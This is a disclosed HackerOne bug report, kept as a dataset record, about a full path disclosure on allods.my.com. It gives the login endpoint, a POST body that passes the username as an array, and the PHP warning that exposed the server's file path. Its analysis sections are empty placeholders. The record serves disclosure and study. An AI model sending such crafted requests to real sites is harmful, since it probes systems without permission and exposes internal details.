---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '97319'
original_report_id: '97319'
title: '[allods.my.com] Full Path Disclosure'
weakness: Information Disclosure
team_handle: mailru
created_at: '2015-11-02T20:43:32.178Z'
disclosed_at: '2017-03-03T13:14:30.797Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- information-disclosure
---

# [allods.my.com] Full Path Disclosure

## Metadata

- HackerOne Report ID: 97319
- Weakness: Information Disclosure
- Program: mailru
- Disclosed At: 2017-03-03T13:14:30.797Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Возникает из-за передачи переменной username как массива.

allods.my.com/forum/wcf/acp/index.php?form=Login

_POST

packageID=1&password=1&s=1&url=&username[]=1

error message: PHP warning in file /opt/WWWRoot/allods.com/wwwroot/forum/wcf/lib/util/StringUtil.class.php (118): trim() expects parameter 1 to be string, array given

Screen attached.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
